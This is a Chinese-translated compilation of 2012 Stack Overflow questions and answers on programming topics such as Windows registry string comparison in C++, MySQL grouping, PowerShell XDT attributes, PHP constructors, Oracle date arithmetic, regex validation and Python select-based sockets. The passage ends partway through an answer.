> 时间：2012-10-18T12:40:55.643
> 
> 标签：c++, winapi, registry

> **可能重复：**
> [如何比较字符串](https://stackoverflow.com/questions/6222583/how-to-compare-strings)

我想比较注册表字符串值，如果它们相同，则会出现一个消息框
目前我正在使用这个函数，它正确返回值但是每当我想比较它们时，比较结果总是错误的

```
char* GetRegistry(char* StringName)
{
DWORD dwType = REG_SZ;
HKEY hKey = 0;
char value[1024];
DWORD value_length = 1024;
const char* subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\MCI\\Player";
RegOpenKey(HKEY_LOCAL_MACHINE,subkey,&hKey);
RegQueryValueEx(hKey, StringName, NULL, &dwType, (LPBYTE)&value, &value_length);
return  value;
} 
```

我用它来比较它们

```
if (GetRegistry("First") == GetRegistry("Second"))
{
MessageBox(NULL,":|",":|",1);
} 
```

但是 MessageBox 怎么出现 值是不同的

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T12:51:01.723

通过使用`std::string`，比较将按您的预期进行。这也将修复函数返回指向本地缓冲区的指针的另一个错误。

```
std::string GetRegistry(const char* StringName)
{
....
return std::string(value);
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-18T12:48:12.740

`GetRegistry()`返回 a `char*`，因此您实际上是在将**指针**与`operator==`. 您应该使用`strcmp()`类似 C 的原始`char*`字符串比较，或者更好地使用健壮的 C++ 字符串类，例如`CString`或`std::[w]string`.

这是使用 ATL 可能重写的函数`CString`：

```
#include <atlbase.h>
#include <atlstr.h>

CString GetRegistry(LPCTSTR pszValueName)
{
    // Try open registry key
    HKEY hKey = NULL;
    LPCTSTR pszSubkey = _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\MCI Extensions");
    if ( RegOpenKey(HKEY_LOCAL_MACHINE, pszSubkey, &hKey) != ERROR_SUCCESS )
    {
        // Error:
        // throw an exception or something...
        //
        // (In production code a custom C++ exception 
        // derived from std::runtime_error could be used)
        AtlThrowLastWin32();
    }

    // Buffer to store string read from registry
    TCHAR szValue[1024];
    DWORD cbValueLength = sizeof(szValue);

    // Query string value
    if ( RegQueryValueEx(
            hKey,
            pszValueName, 
            NULL, 
            NULL, 
            reinterpret_cast<LPBYTE>(&szValue), 
            &cbValueLength) 
         != ERROR_SUCCESS )
    {
        // Error
        // throw an exception or something...
        AtlThrowLastWin32();
    }

    // Create a CString from the value buffer
    return CString(szValue);
} 
```

然后你可以这样称呼它：

```
if ( GetRegistry(_T("First")) == GetRegistry(_T("Second")) )
    ... 
```

请注意，此代码将在 ANSI/MBCS 和 Unicode 版本中编译（它基于 Win32`TCHAR`模型）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T13:04:34.207

这个源代码有几个问题。

首先，您有一个带有局部变量的函数，堆栈上的一个变量，它返回该变量的地址，但是当函数返回时，变量消失并且地址不再有效。

下一个问题是您没有比较字符串。相反，您正在比较函数返回的地址，如果幸运的话，地址可能是相同的。由于您连续两次调用该函数，因此您很幸运，因此地址相同。

我建议您执行以下操作：（1）在调用该函数的函数中创建两个本地字符串，`GetRegistry()`以及（2）修改该`GetRegistry()`函数，使其使用这些缓冲区而不是它自己的缓冲区。所以代码看起来像：

```
char registryEntryOne[1024];
char registryEntryTwo[1024];
DWORD dwRegistryEntryOneLen;
DWORD dwRegistryEntryTwoLen;

registryEntryOne[0] = 0;   // init the registry entry to zero length string
registryEntryTwo[0] = 0;

dwRegistryEntryOneLen = sizeof(registryEntryOne);
GetRegistry ("First", registryEntryOne, &dwRegistryEntryOneLen);
dwRegistryEntryTwoLen = sizeof(registryEntryTwo);
GetRegistry ("Second", registryEntryTwo, &dwRegistryEntryTwoLen);

// two strings are equal if:
//   the lengths are the same
//   at least one of the lengths is non-zero
//   the bytes are the same in the same order
if (dwRegistryEntryOneLen && dwRegistryEntryOneLen == dwRegistryEntryTwoLen && memcmp (registryEntryOne, registryEntryTwo, dwRegistryEntryOneLen) == 0) {
    // strings are equal
} else {
    // strings are not equal
} 
```

GetRegistry() 函数看起来像：

```
char* GetRegistry(char* StringName, char *valueBuffer, DWORD *value_length)
{
    DWORD dwType = REG_SZ;
    HKEY hKey = 0;
    const char* subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\MCI\\Player";

    RegOpenKey(HKEY_LOCAL_MACHINE,subkey,&hKey);
    RegQueryValueEx(hKey, StringName, NULL, &dwType, (LPBYTE)valueBuffer, value_length);
    return  valueBuffer;
} 
```

# php - 如何从 MySQL/PHP 获取每个主题的主题名称和错过的作业总数

> ID：12954929
> 
> 赞同：2
> 
> 时间：2012-10-18T12:41:17.683
> 
> 标签：php, mysql

我在 MySQL 中有以下表格。（我正在使用 php/mysql）

```
CREATE TABLE `hw_subjects` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`id`)
)  ;

...
INSERT INTO `hw_subjects` VALUES(4, 'Design');
INSERT INTO `hw_subjects` VALUES(5, 'Drama');
...
INSERT INTO `hw_subjects` VALUES(11, 'Humanities');
...
INSERT INTO `hw_subjects` VALUES(13, 'Mathematics');
...

following shows students missed homework

CREATE TABLE `hw_homeworkmissed` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `studentid` int(10) NOT NULL,
  `subjectid` int(10) NOT NULL,
  `assignment_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `teacherid` int(10) NOT NULL,
  `date` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ;

INSERT INTO `hw_homeworkmissed` VALUES(1, 29, 5, '5E', 20, '2012-10-18 13:58:40');
INSERT INTO `hw_homeworkmissed` VALUES(2, 15, 5, '32B', 20, '2012-10-18 13:59:54');
INSERT INTO `hw_homeworkmissed` VALUES(3, 29, 4, 'Q2A', 20, '2012-10-18 17:53:46');
INSERT INTO `hw_homeworkmissed` VALUES(4, 29, 11, '6E', 20, '2012-10-02 20:06:39');
INSERT INTO `hw_homeworkmissed` VALUES(5, 29, 11, 'C15', 20, '2012-10-16 20:06:30');
INSERT INTO `hw_homeworkmissed` VALUES(6, 15, 11, '7A', 20, '2012-09-19 20:08:05');
INSERT INTO `hw_homeworkmissed` VALUES(7, 29, 5, '3B', 20, '2012-09-14 20:08:12');
INSERT INTO `hw_homeworkmissed` VALUES(8, 29, 13, '6E', 32, '2012-10-18 20:23:46');
... 
```

我想显示一个学生（比如说 studentid ==29）错过了家庭作业。所以我需要科目和每个科目错过的作业总数。（我正在使用谷歌图表）

```
Mathematics,3
Science, 1
Humanities, 2 
etc. 
```

我该怎么做？提前致谢。

更新：

我可以得到以下数组。但我不确定我是否可以使用它。我加入了两个学生ID = 29的表

```
Array
(
    [0] => Array
        (
            [id] => 5
            [studentid] => 29
            [subjectid] => 5
            [assignment_name] => 5E
            [teacherid] => 20
            [date] => 2012-10-18 13:58:40
            [name] => Drama
        )

    [1] => Array
        (
            [id] => 4
            [studentid] => 29
            [subjectid] => 4
            [assignment_name] => Q2A
            [teacherid] => 20
            [date] => 2012-10-18 17:53:46
            [name] => Design
        )

    [2] => Array
        (
            [id] => 11
            [studentid] => 29
            [subjectid] => 11
            [assignment_name] => 6E
            [teacherid] => 20
            [date] => 2012-10-02 20:06:39
            [name] => Humanities
        )

    [3] => Array
        (
            [id] => 11
            [studentid] => 29
            [subjectid] => 11
            [assignment_name] => C15
            [teacherid] => 20
            [date] => 2012-10-16 20:06:30
            [name] => Humanities
        )

    [4] => Array
        (
            [id] => 5
            [studentid] => 29
            [subjectid] => 5
            [assignment_name] => 3B
            [teacherid] => 20
            [date] => 2012-09-14 20:08:12
            [name] => Drama
        )

    [5] => Array
        (
            [id] => 13
            [studentid] => 29
            [subjectid] => 13
            [assignment_name] => 6E
            [teacherid] => 32
            [date] => 2012-10-18 20:23:46
            [name] => Mathematics
        )

)
....
.... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:57:49.633

在您的 SELECT 和 GROUP BY subjectid 中使用 COUNT(id)

```
SELECT 
    hw_subjects.name, 
    COUNT(hw_homeworkmissed.id) 
FROM hw_subjects, hw_homeworkmissed 
WHERE hw_subjects.id= hw_homeworkmissed.subjectid 
GROUP BY subjectid 
ORDER BY hw_subjects.name 
```

# xml - xdt 与 powershell

> ID：12954933
> 
> 赞同：4
> 
> 时间：2012-10-18T12:41:27.920
> 
> 标签：xml, powershell, xdt-transform

其实我对xtd-transform了解不多。我在 xdt 文件中需要什么：

```
<add key="EndpointName" value="SomeValue" xdt:Transform="SetAttributes(value)" xdt:Locator="Match(key)" /> 
```

我在 powershell 中做的日常工作：

```
$cache.SetAttribute("key","EndpointName")
$cache.SetAttribute("value","SomeValue")
$cache.SetAttribute("xdt:Transform","SetAttributes(value)")
$cache.SetAttribute("xdt:Locator","Match(key)") 
```

这就是我所拥有的。不符合我的观点：

```
<add key="EndpointName" value="Email" Transform="SetAttributes(value)" Locator="Match(key)" /> 
```

那么是否可以使用 powershell 脚本创建 xdt:attribute ？

多谢你们！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T17:41:46.087

当涉及 XML 命名空间时，您需要使用 XmlNamespaceManager 例如：

```
$xdt = 'http://schemas.microsoft.com/XML-Document-Transform'
$xml = [xml]"<doc xmlns:xdt='$xdt'><add key='foo' value='foo' xdt:Transform='foo' xdt:Locator='foo'/></doc>"

$nsmgr = new-object Xml.XmlNamespaceManager $xml.NameTable
$nsmgr.AddNamespace("xdt", $xdt)

$xml.doc.add.SetAttribute('Transform', $xdt, 'SetAttribute(value)') > $null 
```

结果是：

```
<doc xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform">
  <add key="foo" value="foo" xdt:Transform="SetAttribute(value)" xdt:Locator="foo" />
</doc> 
```

# php - PHP构造函数参数？

> ID：12954934
> 
> 赞同：0
> 
> 时间：2012-10-18T12:41:29.120
> 
> 标签：php

我正在构建一个需要两个参数的类，它们可以通过 传递`__constructor`，也可以使用 setter 方法设置。

检查参数是否通过构造函数传递的最佳方法是什么？

我是这样做的：

```
class Services {

    public function __construct(array $configs, array $services)
    {
        if(isset($configs) AND isset($services)) {
            $this->configs = $configs;
            $this->services = $services;
        }
    }

    public function setConfigs(array $configs)
    {
        $this->config = $configs;
    }

    public function setServices(array $services)
    {
        $this->services = $services;
    }
} 
```

现在这工作正常，但如果这是正确的方法，我不是 100%。困扰我的是，如果参数是通过构造函数传递的，我希望它们都在那里，而不仅仅是一个。

如何防止用户在构造函数中只放置一个参数？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T12:47:26.373

目前你*必须*传递两个参数。要使它们成为可选，您需要分配默认值。然后，您可以通过简单的检查来强制执行两者：

```
public function __construct(array $configs = null, array $services = null) {
    if ($configs === null xor $services === null) {
        throw new InvalidArgumentException('Supply both or none!');
    }
    if ($configs && $services) {
        $this->setConfigs($configs);
        $this->setServices($services);
    }
} 
```

您不应该使用`isset`，因为该*变量*始终存在，因为它是函数签名的一部分。您只需要检查这些值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:54:58.877

你测试过吗？当您在函数头中定义类型时 `__construct(array $configs, array $services)`，您确保用户必须传递两个数组！

```
$test = new Services(array()); 
```

失败 - 可捕获的致命错误：传递给 Services::__construct() 的参数 2 必须是数组

```
$test = new Services('',''); 
```

失败 - 可捕获的致命错误：传递给 Services::__construct() 的参数 1 必须是一个数组，

只要

```
$test = new Services(array(), array()); 
```

被允许！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:44:29.480

你可以添加php`is_null()`函数，所以如果`!is_null(arg1) && !is_null(arg2)`，那么你很好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-18T12:44:57.047

单独处理您传递的参数。

```
public function __construct(array $configs, array $services)
{
    if(isset($configs)) {
        $this->configs = $configs;
    }
    if(isset($services)) {
        $this->services = $services;
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-18T12:47:40.673

我会这样做：

```
public function __construct(array $configs = false, array $services = false)
    {
        if($configs && $services) {
            $this->configs = $configs;
            $this->services = $services;
        }
    } 
```

# html - 如何在 phonegap html5 应用程序中嵌入 TouchDB？

> ID：12954936
> 
> 赞同：3
> 
> 时间：2012-10-18T12:41:31.340
> 
> 标签：html, cordova, couchdb, touchdb

基本上我想要 CouchDB 的同步功能，同时使用 HTML5 开发并使用 phonegapp 打包应用程序。

我看到 couchbase mobile 有一些缺点（代码量大，启动时间长），而 TouchDB 似乎很有前途。但是，我找不到将 TouchDB 与 Phonegapp 集成的明显方法。这可能吗？或者正确的方法是什么？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T09:58:48.363

我认为在 phonegap 应用程序上使用 TouchDB 的最佳方法是开发一个 phonegap-plugin 允许您从 JavaScript/HTML PhoneGap-app 访问 touchDB，

这意味着您应该为 Android 开发一个调用 TouchAndroid 的 phonegap-plugin，为 IOS 开发另一个调用 TouchIOS 的 phonegap-plugin 等。

希望这有帮助，

# html - 在输入框末尾添加可点击区域

> ID：12954938
> 
> 赞同：0
> 
> 时间：2012-10-18T12:41:34.520
> 
> 标签：html, css

这是我正在使用的代码：

[http://jsfiddle.net/5yEGX/](http://jsfiddle.net/5yEGX/)

我想在这个文本框的末尾放一些东西，例如，两个字母和一个图像到像“UK”这样的字段的末尾，整个额外的区域可以作为链接点击。

这样做的正确方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T12:50:47.227

正如@SvenBieder 在他的评论中提到的那样，您可以通过将输入字段和锚点放在包装器元素内并相应地定位/样式来实现这一点。

[http://jsfiddle.net/5yEGX/5/](http://jsfiddle.net/5yEGX/5/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T13:16:47.293

Joe 的解决方案是最好的方法，但为了完整起见，我提供了另一种解决方案，在文本区域上使用绝对定位的 div，它使用一点 jquery 来收集文本区域的宽度并相应地定位覆盖，请参阅[**演示**](http://jsfiddle.net/5yEGX/19/)。

**更新：**
使用 padding-right 更新了演示，因此文本不会到达绝对定位的元素（UK+image）。

问候，

# java - 使用 CouchbaseClient 操作超时

> ID：12954941
> 
> 赞同：3
> 
> 时间：2012-10-18T12:41:46.947
> 
> 标签：java, couchbase, timeoutexception, spymemcached

即使 Couchbase 服务器上没有太多负载，我也会收到超时异常。

```
net.spy.memcached.OperationTimeoutException: Timeout waiting for value
        at net.spy.memcached.MemcachedClient.get(MemcachedClient.java:1003)
        at net.spy.memcached.MemcachedClient.get(MemcachedClient.java:1018)
        at com.eos.cache.CacheClient.get(CacheClient.java:280)
        at com.eos.cache.GenericCacheAccessObject.get(GenericCacheAccessObject.java:55)
...
...
Caused by: net.spy.memcached.internal.CheckedOperationTimeoutException: Timed out waiting for operation - failing node: /192.168.4.12:11210
        at net.spy.memcached.internal.OperationFuture.get(OperationFuture.java:157)
        at net.spy.memcached.internal.GetFuture.get(GetFuture.java:62)
        at net.spy.memcached.MemcachedClient.get(MemcachedClient.java:997)
        ...30 more 
```

这就是我创建客户端的方式。

```
List<URI> uris = new ArrayList<URI>();
        String[] serverTokens = getServers().split(" ");
        for (int index = 0; index < serverTokens.length; index++) {
            uris.add(new URI(serverTokens[index]));
        }
        CouchbaseConnectionFactoryBuilder ccfb = new CouchbaseConnectionFactoryBuilder();
        ccfb.setProtocol(Protocol.BINARY);
        ccfb.setOpTimeout(10000); // wait up to 10 seconds for an operation to
        // succeed
        ccfb.setOpQueueMaxBlockTime(5000); // wait up to 5 seconds when trying
        // to enqueue an operation
        ccfb.setMaxReconnectDelay(1500);
        CouchbaseConnectionFactory cf = ccfb.buildCouchbaseConnection(uris, bucket, "");
        CouchbaseClient client = new CouchbaseClient(cf); 
```

我正在我们的 Web 服务器中维护一个持久客户端池。我们甚至没有触及仅设置为 15 的最大连接限制。请帮我解决这个问题。

# qt - Qt如何知道小部件，用户上次在哪些元素中设置了焦点

> ID：12954945
> 
> 赞同：2
> 
> 时间：2012-10-18T12:41:58.233
> 
> 标签：qt, qwidget, qevent

Qt。我有一个表格。上面有 2 个小部件，包含其他小部件、按钮、行编辑等。我需要：当用户设置焦点、通过鼠标单击或对它包含的第一个小部件或元素执行某些操作时 - 我需要将变量设置为 0 . 如果他对第二个小部件做同样的事情 - 变量必须设置在 1\. 怎么做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T14:22:57.380

`QApplication::focusWidget()`返回指向此时具有焦点的小部件的指针。还有`QApplication::focusChanged(QWidget *old, QWidget *now)`信号，您可以将其连接到插槽以更改变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T13:08:41.363

您始终可以使用自己的插槽和信号重新定义/（通过继承创建子类）小部件。

据我了解您的要求，您可以做到。

QObject::connect(wid1,SIGNAL(clicked()),yourvariableclass,SLOT(setMyVariable_wid1())); QObject::connect(wid2,SIGNAL(clicked()),yourvariableclass,SLOT(setMyVariable_wid2()));

如果我的回答不适合您的问题，请多解释一下问题。我可以帮你。:)

# oracle - 如何在 Oracle sp 中添加 2 个日期？

> ID：12954947
> 
> 赞同：-2
> 
> 时间：2012-10-18T12:42:03.197
> 
> 标签：oracle, date-arithmetic

oracle 中如何添加两个日期？例如在sql中我们可以这样做，“date_1 + date_2”我们如何在Oracle中实现同样的事情

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:58:26.270

将两个日期加在一起没有意义，但您可以在时间戳中添加一个间隔。例如，将 1 年 10 个月添加到时间戳：

```
SELECT SYSDATE + INTERVAL '1-10' YEAR TO MONTH FROM DUAL; 
```

您还可以`DATE`使用简单的算术将天数添加到列中。例如，您可以使用以下命令将 45 天添加到当前日期：

```
SELECT CURRENT_DATE + 45 FROM DUAL; 
```

# linux - 在 64 位 Linux 上 _start 和 __libc_start_main 的参数发生了什么？

> ID：12954952
> 
> 赞同：0
> 
> 时间：2012-10-18T12:42:40.160
> 
> 标签：linux, 64-bit, 32-bit, elf, disassembly

我正在阅读[http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)并尝试手动验证。

_start的反汇编如下：

```
080482e0 <_start>: 80482e0: 31 ed xor %ebp,%ebp
80482e2: 5e pop %esi
80482e3: 89 e1 mov %esp,%ecx 
80482e5: 83 e4 f0 and $0xfffffff0,%esp 
80482e8: 50 push %eax 
80482e9: 54 push %esp 
80482ea: 52 push %edx 
80482eb: 68 00 84 04 08 push $0x8048400 
80482f0: 68 a0 83 04 08 push $0x80483a0 
80482f5: 51 push %ecx 80482f6: 56 push %esi 
80482f7: 68 94 83 04 08 push $0x8048394 
80482fc: e8 c3 ff ff ff call 80482c4 <__libc_start_main@plt> 
8048301: f4 hlt 
```

但是我自己的反汇编如下：

```
0x00000000004003c0 <+0>:     xor    ebp,ebp
0x00000000004003c2 <+2>:     mov    r9,rdx
0x00000000004003c5 <+5>:     pop    rsi
0x00000000004003c6 <+6>:     mov    rdx,rsp
0x00000000004003c9 <+9>:     and    rsp,0xfffffffffffffff0
0x00000000004003cd <+13>:    push   rax
0x00000000004003ce <+14>:    push   rsp
0x00000000004003cf <+15>:    mov    r8,0x400650
0x00000000004003d6 <+22>:    mov    rcx,0x4005c0
0x00000000004003dd <+29>:    mov    rdi,0x40051c
0x00000000004003e4 <+36>:    call   0x4003b0 <__libc_start_main@plt>
0x00000000004003e9 <+41>:    hlt    
0x00000000004003ea <+42>:    nop
0x00000000004003eb <+43>:    nop 
```

所以我的问题只是在第一次反汇编中推入堆栈的 __libc_start_main 的参数发生了什么？

我的文件是“ELF 64 位 LSB 可执行文件，x86-64，版本 1 (SYSV)，动态链接（使用共享库），未剥离。” 即动态链接为[http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)中的文件也是如此。

这是因为我的系统是 64 位的，而链接中使用的系统是 32 位的吗？__libc_start_main 的定义是否改变了？

# android - 不小心删除了android依赖文件夹

> ID：12954960
> 
> 赞同：6
> 
> 时间：2012-10-18T12:43:06.363
> 
> 标签：android, android-library

我不小心删除了库：“android 依赖项”。有没有办法检索或导入/下载？一个人建议我“去源代码并说除了android defualt libs之外你需要的所有库的订单导入导出......”但我不明白它的确切含义。任何建议将不胜感激！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-05-08T11:24:29.987

[另一个stackoverflow帖子](https://stackoverflow.com/questions/10779868/what-is-android-dependencies-remove-it-from-build-path-classnotfoundexception)包含此问题的解决方案。您不必重新启动eclipse。

只需右键单击项目-> Android 工具-> 修复项目属性，您的 Android 依赖项文件夹就会出现。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-18T13:44:26.587

查看 project.properties 文件。您将看到您使用的 android sdk 版本（示例：target=android-4）。然后 Project -> Right Click -> Java Build Path -> (Your SDK folder -> platform -> android-x(your api version number) -> android.jar(Select this))。并清理您的项目。试试这个。

# post - 将数据发布到 ASP.NET MVC 4 中的 Web api 控制器时，日期格式发生变化

> ID：12954961
> 
> 赞同：2
> 
> 时间：2012-10-18T12:43:10.253
> 
> 标签：post, asp.net-mvc-4, asp.net-web-api

我将数据发布到我的 web api，我发布的参数之一是日期选择器选择的日期。

以下是操作的发布数据（从萤火虫获得这些值）

> EndDate : "18/10/2012" (注: 格式为 : dd/mm/yyyy)
> 
> ABC：“别打扰……”
> 
> XYZ：“别打扰……”
> 
> LMNO：“别打扰……”

现在在我的控制器中，我有一个包含上述 3 个字符串字段和一个日期字段的类

```
public class PostModel{

  public string ABC {get;set;}
  public string XYZ {get;set;}
  public string LMNO {get;set;}
  public DateTime EndDate {get;set;}
} 
```

在我的 web api 中，它看起来有点像下面显示的

```
public Something PostSomething(PostModel model)
{} 
```

**在这里，我以“mm/dd/yyyy”的格式获取 EndDate 的值。我想要的是“dd/mm/yyyy”。**

因此，为此我还在 web.config 文件中添加了一个条目，如下所示...

```
<system.web>
<globalization uiCulture="en-GB" culture="en-GB" />
</system.web> 
```

这仍然没有帮助，请有人告诉我我在做什么错吗？

**更令人震惊的发现！！！**

我只是用普通控制器而不是 web api 控制器尝试了这个，它适用于非 api 控制器。有没有其他人遇到过这个问题？

对于正常操作（非 Web api），我什至不必为此设置任何文化。

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T04:23:38.407

将我的结束日期日期时间字段更改为字符串，然后将此结束日期作为字符串发布到我的控制器。

然后在控制器中使用`DateTime.Parse()`.

我知道这不是人们想要的最佳解决方案，但这可以完成工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:12:20.243

我想知道您是否可以在 JsonMediaTypeFormatter 上调整您的 JsonSerializerSettings。

config.Formatters.JsonFormatter.SerializerSettings.DateFormatHandling = ...

# objective-c - 图像在处理后旋转。我怎样才能正确地做到这一点？

> ID：12954964
> 
> 赞同：0
> 
> 时间：2012-10-18T12:43:18.600
> 
> 标签：objective-c, uiimage, quartz-graphics

我的问题是： UIImage 处理后旋转。

我为图像处理使用了一个名为`ProcessHelper`. 这个类有两个方法：

```
+ (unsigned char *) convertUIImageToBitmapRGBA8:(UIImage *) image;

+ (UIImage *) convertBitmapRGBA8ToUIImage:(unsigned char *)rawData
                                withWidth:(int) width
                               withHeight:(int) height; 
```

执行

```
+ (unsigned char *) convertUIImageToBitmapRGBA8:(UIImage *) image {

    NSLog(@"Convert image [%d x %d] to RGBA8 char data", (int)image.size.width,
                                                       (int)image.size.height);
    CGImageRef imageRef = [image CGImage];
    NSUInteger width = CGImageGetWidth(imageRef);
    NSUInteger height = CGImageGetHeight(imageRef);
    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
    unsigned char *rawData = malloc(height * width * 4);
    NSUInteger bytesPerPixel = 4;
    NSUInteger bytesPerRow = bytesPerPixel * width;
    NSUInteger bitsPerComponent = 8;
    CGContextRef context = CGBitmapContextCreate(rawData,
                                                   width,
                                                   height,
                                                   bitsPerComponent,
                                                   bytesPerRow,
                                                   colorSpace,
                    kCGImageAlphaPremultipliedLast | kCGBitmapByteOrder32Big);

    CGColorSpaceRelease(colorSpace);

    CGContextDrawImage(context, CGRectMake(0, 0, width, height), imageRef);
    CGContextRelease(context);

    return rawData;
}

+ (UIImage *) convertBitmapRGBA8ToUIImage:(unsigned char *) rawData
                                withWidth:(int) width
                               withHeight:(int) height {

    CGContextRef ctx = CGBitmapContextCreate(rawData,
                                             width,
                                             height,
                                             8,
                                             width * 4,
                                             CGColorSpaceCreateDeviceRGB(),
                                             kCGImageAlphaPremultipliedLast );

    CGImageRef imageRef = CGBitmapContextCreateImage (ctx);
    UIImage* rawImage = [UIImage imageWithCGImage:imageRef];  

    CGContextRelease(ctx);  

    free(rawData);

    return rawImage;
} 
```

我

开始时我得到像素数据：

```
 rawData = [ProcessHelper convertUIImageToBitmapRGBA8:image]; 
```

接下来我做一些处理：

```
-(void)process_grayscale {
int byteIndex = 0;
for (int i = 0 ; i < workingImage.size.width * workingImage.size.height ; ++i)
    {
    int outputColor = (rawData[byteIndex] + rawData[byteIndex+1] + rawData[byteIndex+2]) / 3;

    rawData[byteIndex] = rawData[byteIndex + 1] = rawData[byteIndex + 2] = (char) (outputColor);

    byteIndex += 4;
    }

workingImage = [ProcessHelper convertBitmapRGBA8ToUIImage:rawData
                                                withWidth:CGImageGetWidth(workingImage.CGImage)
                                               withHeight:CGImageGetHeight(workingImage.CGImage)];
} 
```

在此之后，我返回`workingImage`父类并`UIImageView`显示它返回但旧尺寸，我的意思是：图像之前是 WxH，之后是 WxH，但旋转后（应该是 HxW，旋转后）。我想让图像不旋转。

当我从 ipad 编辑照片时会发生这种情况。屏幕截图还可以，来自互联网的图像（例如背景）也可以。

我怎样才能正确地做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T13:20:05.667

使用`UIGraphicsPushContext(ctx); [image drawInRect:CGRectMake(0, 0, width, height)]; UIGraphicsPopContext();`而不是`CGContextDrawImage`. `CGContextDrawImage`将垂直翻转图像。

或者在调用之前缩放和转换上下文`CGContextDrawImage`

# javascript - int 和 float 的正则表达式都不能正常工作

> ID：12954966
> 
> 赞同：1
> 
> 时间：2012-10-18T12:43:21.510
> 
> 标签：javascript, regex, string

我需要允许用户在文本框中只输入整数（33）和浮点数（33.343）。

下面是我的正则表达式查询，但它不能正常工作。它允许用户输入浮点值，但在 int 值上给出错误。但我也需要允许用户输入 int。当用户输入任何其他类型的值时，它工作正常并给出错误消息。

```
/^[0-9]*[.][0-9]*$/ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:46:09.760

使点和它后面的部分成为可选的：

```
"^\d+(?:\.\d+|)$" 
```

也更喜欢`\d`，`[0-9]`不要使用，`*`因为那时你允许没有数字的任何一方的可能性`.`

这将接受：

```
1
1.23 
```

但不是：

```
.1
23. 
```

如果你想要那种行为，这取决于你。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-18T12:47:22.337

尝试：

```
/^[0-9]+(?:\.[0-9]+)?$/ 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-18T12:45:47.637

使用正则表达式模式

```
^(?=.*\d)\d*(?:\.\d*)?$ 
```

例如，这将匹配：

```
1234
123.
1.23
12.3
0.12
.123 
```

# python - 带选择的多播

> ID：12954969
> 
> 赞同：0
> 
> 时间：2012-10-18T12:43:24.783
> 
> 标签：python, sockets, select, multicast, python-sockets

我的服务器可以正常使用我的选择功能：

```
readable, writable, exceptional = select.select(inputs, outputs, timeout) 
```

这是可写循环的代码：

```
for s in writable:
    try:
        next_msg = message_queues[s].get_nowait()
    except Queue.Empty:
        # No messages waiting so stop checking for writability.
        print >>sys.stderr, 'output queue for', s.getpeername(), 'is empty'
        outputs.remove(s)
    else:
        print >>sys.stderr, 'sending "%s" to %s' % (next_msg, s.getpeername())
        s.send(next_msg) 
```

s 是套接字对象。这里的代码只发送给发送东西的客户。我只想将 next_msg 多播到彼此的可写套接字，所以我尝试了：

```
for s in writable:
    try:
        next_msg = message_queues[s].get_nowait()
    except Queue.Empty:
        # No messages waiting so stop checking for writability.
        print >>sys.stderr, 'output queue for', s.getpeername(), 'is empty'
        outputs.remove(s)
    else:
        for multicast in writable:
            print >>sys.stderr, 'sending "%s" to %s' % (next_msg, multicast.getpeername())
            multicast.send(next_msg) 
```

但这不起作用，它总是只发送给发件人。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-19T00:52:20.627

好的多播现在可以了。我认为 writable 包含一个可写套接字列表，但它只是一个被选中的。如果只有一个可写的套接字，我真的不明白第一个带有“for s in writable”的循环但是......所以！它适用于输入列表：

```
for multicast in inputs:
        if multicast is not server:
                print >>sys.stderr, 'sending "%s" to %s' % (next_msg, multicast.getpeername())
                multicast.send(next_msg) 
```

# asp.net - 转发器 ASP .NET 数据绑定到 navigationURL

> ID：12954970
> 
> 赞同：0
> 
> 时间：2012-10-18T12:43:33.503
> 
> 标签：asp.net, databinder

我正在尝试将 ID 绑定到超链接中已定义的导航 url。

```
<asp:HyperLink ID="HyperLink4" runat="server" 
    NavigateUrl='accounts_history.aspx?accountId=<%# DataBinder.Eval(Container.DataItem, "Id") %>'>Historiek</asp:HyperLink> 
```

这是我的超链接。该`<%# DataBinder.Eval(Container.DataItem, "Id") %>`部分有效，但使用此方法，超链接仅将其视为明文，导致以下链接：

```
accounts_history.aspx?accountId=<%# DataBinder.Eval(Container.DataItem, "Id") %> 
```

这是什么原因造成的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:48:14.690

尝试这个

```
